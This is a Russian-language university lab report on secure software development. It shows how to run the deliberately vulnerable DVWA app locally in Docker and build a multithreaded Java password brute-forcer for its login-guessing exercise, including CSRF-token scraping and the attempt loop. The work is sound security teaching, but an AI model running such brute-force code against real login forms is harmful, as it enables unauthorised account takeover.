# SDLC_Lab_3
Практика №3 по "Разработке безопасного программного обеспечения"

1. Необходимо разработать переборщик паролей для формы в задании Bruteforce на сайте dvwa.local (Можно использовать официальный ресурс или виртуальную машину Web Security Dojo)

  Для перебора паролей для начала необходимо размернуть приложение DVWA. Развернем его в Docker, для этого необходимо перейти в папку /DVWA-master и выполнить команду `docker compose up` в терминале. \
  ![Поднимаем DVWA](imgs/dvwa_up.png) \
  Перейдем по адресу `localhost:4280` в браузере. \
  ![Переходим на localhost:4280](imgs/dvwa_visit.png) \
  Перейдем на форму, которая является переборщика. \
  ![Переходим на форму](imgs/dvwa_form_visit.png) \
  Выполним успешный ввод данных. \
  ![Успешный ввод](imgs/dvwa_form_success.png) \
  Обратим внимание на сообщение, которое выводится при успешном вводе, а также на то, в какой форме производится запрос.\
  ![Сообщение об успехе](imgs/dvwa_success_message.png) ![Форма запроса](imgs/dvwa_query_form.png) \
  Выполним неудачный ввод данных и так же обратим внивание на сообщение. \
  ![Неудачный ввод](imgs/dvwa_form_fail.png) ![Сообщение о провале](imgs/dvwa_fail_message.png) \
  На основе полученной информации разработаем переборщик паролей на языке программирования Java. Программа будет работать в многопоточном режиме. Для перехода к форме, которую необходимо взломать необходимо авторизоваться на сайте. Напишем для этого функцию.
  ```Java
        private void loginToDVWA() throws IOException {
            String loginPageUrl = "http://localhost:4280/login.php";
            String username = "admin";
            String password = "password";
            String csrfToken;

            Request loginPageRequest = new Request.Builder()
                .url(loginPageUrl)
                .get().build();

            try (Response response = client.newCall(loginPageRequest).execute()) {
                assert response.body() != null;
                String html = response.body().string();
                String substringForBeginInd = "name='user_token' value='";
                int begInd = html.indexOf(substringForBeginInd);
                int endInd = html.indexOf("' />\r\n\r\n\t</form>");
                csrfToken = html.substring(begInd + substringForBeginInd.length(), endInd);
            }

            RequestBody formBody = new FormBody.Builder()
                .add("username", username)
                .add("password",  password)
                .add("Login", "Login")
                .add("user_token", csrfToken)
                .build();
            Request loginRequest = new Request.Builder()
                .url(loginPageUrl)
                .post(formBody)
                .build();

            try (Response response = client.newCall(loginRequest).execute()) {
                assert response.body() != null;
            }
        }
```
  Алгоритм программы будет выполнять попытку аутентификации по адресу, который был обнаружен раннее `http://localhost:4280/vulnerabilities/brute/?username=admin&password=%s&Login=Login`. Переборщик анализирует html, который приходит в ответ и ищет сообщение об успешном входе или провале. Функция для попытки аутентификации выглядит следующим образом:
  ```Java
private boolean makeAttemptToLogin(String password) throws IOException {
            String loginPage = BASE_URL + "/brute/?username=admin&password=%s&Login=Login"
                .formatted(password);

            Request loginAttempt = new Request.Builder()
                .url(loginPage)
                .get()
                .build();

            try (Response response = client.newCall(loginAttempt).execute()) {
                assert response.body() != null;
                String html = response.body().string();
                if (html.contains("Username and/or password incorrect.")) {
                    return false;
                } else if (html.contains("Welcome to the password protected area admin")) {
                    return true;
                } else {
                    Thread.sleep(2000);
                    makeAttemptToLogin(password);
                    return false;
                }
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
```
Пароли извлекаются из файла и поочереди используются в запросах. Запустим переборщик. \
![Запуск перебора DVWA](imgs/dvwa_brute_start.png) \
Таким образом переборщик справился за 21 секунду. \
![Финиш перебора DVWA](imgs/dvwa_brute_finish.png) \
  
  
